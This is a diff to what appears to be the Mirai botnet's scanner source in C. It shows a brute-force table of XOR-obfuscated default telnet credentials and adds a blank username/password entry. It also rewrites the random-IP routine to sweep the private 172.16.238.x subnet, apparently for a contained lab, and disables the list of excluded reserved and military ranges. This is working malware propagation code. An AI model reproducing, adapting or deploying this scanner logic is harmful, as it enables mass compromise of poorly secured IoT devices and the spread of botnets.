@@ -133,6 +133,7 @@ void scanner_init(void)
     add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
     add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
     add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
+    add_auth_entry("", "", 4);                                                              // (none)   (none)
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
     add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
     add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
@@ -671,12 +672,14 @@ static void setup_connection(struct scanner_connection *conn)
     connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
 }
 
+static uint8_t device = 1;
+
 static ipv4_t get_random_ip(void)
 {
     uint32_t tmp;
-    uint8_t o1, o2, o3, o4;
+    uint8_t o1 = 172, o2 = 16, o3 = 238, o4 = (device++)%255;
 
-    do
+    /* do
     {
         tmp = rand_next();
 
@@ -698,7 +701,7 @@ static ipv4_t get_random_ip(void)
           (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
           (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
           (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
-    );
+    ); */
 
     return INET_ADDR(o1,o2,o3,o4);
 }
